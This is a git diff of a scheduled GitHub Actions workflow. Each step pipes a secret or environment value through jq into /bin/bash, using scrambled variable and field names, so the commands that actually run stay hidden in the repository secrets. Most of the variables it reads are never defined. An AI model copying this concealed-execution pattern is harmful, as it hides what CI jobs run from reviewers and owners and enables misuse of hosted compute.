@@ -2,29 +2,26 @@ name: jinxiusx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 4/6 * * *'
+    - cron: '54 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jinxiusx
         env:
-          ypclf82: ${{ secrets.ypclf82 }}
+          w8472: ${{ secrets.w8472 }}
         run: |
-          echo $ypclf82 | jq -r .jv8238 | /bin/bash
-          echo $upk677 | jq -r .jnzxn37353 | /bin/bash
-          echo $frgd967 | jq -r .ah21 | /bin/bash
-          echo $rte24 | jq -r .edah677 | /bin/bash
-          echo $bp29658 | jq -r .odfs381 | /bin/bash
-          echo $zoeov645 | jq -r .wjks55381 | /bin/bash
-          echo $jd82 | jq -r .ekz804 | /bin/bash
-          echo $pul7461 | jq -r .hid1 | /bin/bash
-          echo $cbqn059 | jq -r .puf9 | /bin/bash
-          echo $jr6 | jq -r .nh8 | /bin/bash
-          echo $twpr07781 | jq -r .ls507 | /bin/bash
-          echo $oqx66 | jq -r .xwhsz228 | /bin/bash
-          echo $phgmj96 | jq -r .j95 | /bin/bash
-          echo $bk27219 | jq -r .d1188 | /bin/bash
+          echo $w8472 | jq -r .lmqet5029 | /bin/bash
+          echo $gycn2 | jq -r .yqzoi533 | /bin/bash
+          echo $v21816 | jq -r .qh2325 | /bin/bash
+          echo $chy37 | jq -r .l5837 | /bin/bash
+          echo $my8 | jq -r .ebm639 | /bin/bash
+          echo $hw31220 | jq -r .ebhyt79 | /bin/bash
+          echo $p169 | jq -r .x61 | /bin/bash
+          echo $asj88 | jq -r .gxz4768 | /bin/bash
+          echo $spue1144 | jq -r .kwr9209 | /bin/bash
+          echo $snt272 | jq -r .yjg1 | /bin/bash
 
